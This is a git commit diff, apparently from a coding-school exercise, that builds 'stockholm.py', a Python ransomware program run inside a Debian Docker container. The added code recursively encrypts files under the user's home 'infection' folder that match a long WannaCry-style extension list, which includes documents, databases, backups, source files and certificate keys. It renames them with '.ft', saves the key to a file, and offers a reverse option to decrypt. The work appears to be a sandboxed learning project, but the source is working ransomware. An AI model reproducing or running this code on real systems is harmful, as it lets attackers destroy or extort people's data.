3f40b3e92f3547678eeda72796196bf4dcfd714a
Ismail Mannoucha <ismannou@c2r10s4.42malaga.com>
2023-05-11 20:27:51 +0200

    added parser and some error checks, now encrypting files and decrypting them :)

--- Dockerfile
+++ Dockerfile
@@ -2,11 +2,14 @@ FROM debian
 
 RUN apt update && apt upgrade -y
 
-RUN apt install python3
+RUN apt install python3 -y
 
-RUN apt install pip
+RUN apt install pip -y
 
 RUN pip install cryptography
 
-COPY stockholm.py /tmp/
+COPY infection /root/
 
+COPY stockholm.py /
+
+ENTRYPOINT [ "bash" ]
--- stockholm.py
+++ stockholm.py
@@ -1,13 +1,10 @@
-from cryptography.fernet import Fernet
+from cryptography.fernet import Fernet , InvalidToken
 import os
+import argparse
 
+version = '1.0.0'
 silent = False
-wannacry = ['.doc', '.docm', '.docx', '.dot', 
-            '.dotm', '.dotx', '.lnk', '.pdf',
-            '.ppt', '.pptm', '.pptx', '.psd', 
-            '.rar', '.rtf', '.wb2', '.xls', 
-            '.xlsb', '.xlsm', '.xlsx', '.zip']
-
+wannacry = [".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pst", ".ost", ".msg", ".eml", ".vsd", ".vsdx", ".txt", ".csv", ".rtf", ".123", ".wks", ".wk1", ".pdf", ".dwg", ".onetoc2", ".snt", ".jpeg", ".jpg", ".docb", ".docm", ".dot", ".dotm", ".dotx", ".xlsm", ".xlsb", ".xlw", ".xlt", ".xlm", ".xlc", ".xltx", ".xltm", ".pptm", ".pot", ".pps", ".ppsm", ".ppsx", ".ppam", ".potx", ".potm", ".edb", ".hwp", ".602", ".sxi", ".sti", ".sldx", ".sldm", ".sldm", ".vdi", ".vmdk", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".bz2", ".tbk", ".bak", ".tar", ".tgz", ".gz", ".7z", ".rar", ".zip", ".backup", ".iso", ".vcd", ".bmp", ".png", ".gif", ".raw", ".cgm", ".tif", ".tiff", ".nef", ".psd", ".ai", ".svg", ".djvu", ".m4u", ".m3u", ".mid", ".wma", ".flv", ".3g2", ".mkv", ".3gp", ".mp4", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla", ".swf", ".wav", ".mp3", ".sh", ".class", ".jar", ".java", ".rb", ".asp", ".php", ".jsp", ".brd", ".sch", ".dch", ".dip", ".pl", ".vb", ".vbs", ".ps1", ".bat", ".cmd", ".js", ".asm", ".h", ".pas", ".cpp", ".c", ".cs", ".suo", ".sln", ".ldf", ".mdf", ".ibd", ".myi", ".myd", ".frm", ".odb", ".dbf", ".db", ".mdb", ".accdb", ".sql", ".sqlitedb", ".sqlite3", ".asc", ".lay6", ".lay", ".mml", ".sxm", ".otg", ".odg", ".uop", ".std", ".sxd", ".otp", ".odp", ".wb2", ".slk", ".dif", ".stc", ".sxc", ".ots", ".ods", ".3dm", ".max", ".3ds", ".uot", ".stw", ".sxw", ".ott", ".odt", ".pem", ".p12", ".csr", ".crt", ".key", ".pfx", ".der"]
 
 def log(msg):
     if not silent:
@@ -24,33 +21,70 @@ def encryptFolder(path,key):
     dirs_only = [os.path.join(path,d) for d in file_list if os.path.isdir(os.path.join(path, d))]
     print(files_only)
     print(dirs_only)
-    # encrypt them using MASTER_KEY
-    for file in files_only:
-        with open(file, 'br') as f:
-            content = f.read()
-        fer = Fernet(key)
-        encryptedData = fer.encrypt(content)
-        with open(file, 'bw') as f:
-            f.write(encryptedData)
-            if (not file.endswith('.ft')):
-                os.rename(file,file + '.ft')
-    # rename them '.ft' if not endswith .ft
-    # find all folders
-    # for all dirs call encrypt
-    
-# Folder 
-#  ----> file1
-#  ----> file2
-#  ----> file3
-#  ----> file4
-#  ----> Folder2
-#           ---> file1
-#           ---> file2
-#           ---> file3
-#           ---> file4
+    try:
+        for file in files_only:
+            with open(file, 'br') as f:
+                content = f.read()
+            fer = Fernet(key)
+            encryptedData = fer.encrypt(content)
+            log(f"Encrypting file : {file}")
+            with open(file, 'bw') as f:
+                f.write(encryptedData)
+                if (not file.endswith('.ft')):
+                    os.rename(file,file + '.ft')
+    except Exception as e:
+        print('errioooror')
+    for folder in dirs_only:
+        encryptFolder(folder,key)
 
+def decryptFolder(path,key):
+    # no dirs found , return
+    if not os.access(path, os.R_OK | os.W_OK):
+        log(f'Access denied to {path}')
+        return
+    # find all files, which endswith wannacry exts
+    file_list = os.listdir(path)
+    files_only = [os.path.join(path,f) for f in file_list if os.path.isfile(os.path.join(path, f)) and f.endswith(wannacry)]
+    dirs_only = [os.path.join(path,d) for d in file_list if os.path.isdir(os.path.join(path, d))]
+    print(files_only)
+    print(dirs_only)
+    # decrypt them using MASTER_KEY
+    try:
+        # with open ('ransom_key','rb') as keyfile:
+        #     key = keyfile.read()
+        for file in files_only:
+            with open(file, 'br') as f:
+                content = f.read()
+            fer = Fernet(key)
+            log(f"Decrypting file : {file}")
+            try:
+                decryptedData = fer.decrypt(content)
+            except (InvalidToken,TypeError) :
+                print('Error : Invalid Key.')
+                exit(1)
+            with open(file, 'bw') as f:
+                f.write(decryptedData)
+                os.rename(file,file[:-3])
+    except Exception as e:
+        print(e)
+    for folder in dirs_only:
+        decryptFolder(folder,key)
 
 if __name__ == '__main__':
+    usage = 'usage: stockholm.py [-h] [-v | -r key] [-s]'
+    parser = argparse.ArgumentParser(description='RANSOMWARE')
+    group = parser.add_mutually_exclusive_group()
+    group.add_argument('-v',action='store_true',help='Display the version of the program and exit')
+    group.add_argument('-r','-reverse',type=str,help='Reverse the infection using the key provided as argument',metavar='key',default=None)
+    parser.add_argument('-s','-silent',action='store_true',help='silence the program, no output')
+    args = parser.parse_args()
+    if args.v == False and args.r == None and args.s == False:
+        print(usage)
+        exit(1)
+    silent = args.s
+    if args.v:
+        log(f"version : {version}")
+        exit(0)
     home = os.environ.get('HOME')
     if (home == None):
         log('$HOME not set.')
@@ -60,8 +94,17 @@ if __name__ == '__main__':
     if not os.path.exists(folder):
         log(f'File {folder} does not exist.')
         exit(1)
-    key = Fernet.generate_key()
-    with open('ransom_key', 'w') as f:
-        f.write(f'{key}')
-    print(key)
-    encryptFolder(folder,key)
+    if args.r == None:
+        try:
+            key = Fernet.generate_key()
+            with open('ransom_key', 'w') as f:
+                f.write(f"{key.decode()}")
+            print(key)
+            encryptFolder(folder,key)
+        except Exception as e:
+            print(e)
+    else:
+        try:
+            decryptFolder(folder,args.r)
+        except Exception as e:
+            print(e)
